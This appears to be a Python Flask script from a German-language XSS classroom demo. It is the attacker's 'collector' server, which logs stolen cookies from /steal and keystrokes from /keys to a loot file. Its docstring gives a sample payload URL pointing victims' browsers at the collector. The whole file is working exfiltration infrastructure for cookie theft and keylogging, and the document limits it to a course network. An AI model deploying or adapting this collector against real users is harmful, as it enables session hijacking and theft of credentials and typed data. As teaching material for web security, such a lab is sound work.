"""Sammel-Server für die XSS-Demo (Angreifer-Seite) — im Kurs-Netz.

Nimmt geklaute Cookies / getippte Tasten entgegen und schreibt sie in loot.log.
Läuft auf Port 5001, damit es neben dem Cowboy-Forum (5000) parallel laufen kann.

Damit die Browser der Mitspieler (Opfer) den Collector erreichen, bindet er an
0.0.0.0. In den XSS-Payloads dann DEINE Kurs-Netz-IP eintragen (ipconfig), z. B.
http://192.168.1.42:5001/steal — siehe README.

    python collector.py                 # 0.0.0.0:5001
    python collector.py --port 8000     # anderer Port

Nur im vertrauenswürdigen Kurs-Netz.
"""
import argparse
import os
from datetime import datetime

from flask import Flask, request

app = Flask(__name__)
LOOT = "loot.log"


def log(kind: str, data: str, src: str) -> None:
    line = f"[{datetime.now():%H:%M:%S}] {kind} von {src}: {data}\n"
    with open(LOOT, "a", encoding="utf-8") as fh:
        fh.write(line)
    print(line, end="")


@app.route("/steal")
def steal():
    log("COOKIE", request.args.get("c", ""), request.remote_addr)
    return "", 204


@app.route("/keys", methods=["GET", "POST"])
def keys():
    data = request.args.get("k") or request.get_data(as_text=True)
    log("KEYS", data, request.remote_addr)
    return "", 204


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=os.environ.get("HOST", "0.0.0.0"))
    ap.add_argument("--port", type=int, default=int(os.environ.get("PORT", "5001")))
    args = ap.parse_args()
    print(f" * Collector lauscht auf http://{args.host}:{args.port}  -> loot.log")
    # Angreifer-Sammelstelle im Kurs-Netz (0.0.0.0, damit Opfer-Browser sie erreichen).
    app.run(host=args.host, port=args.port)
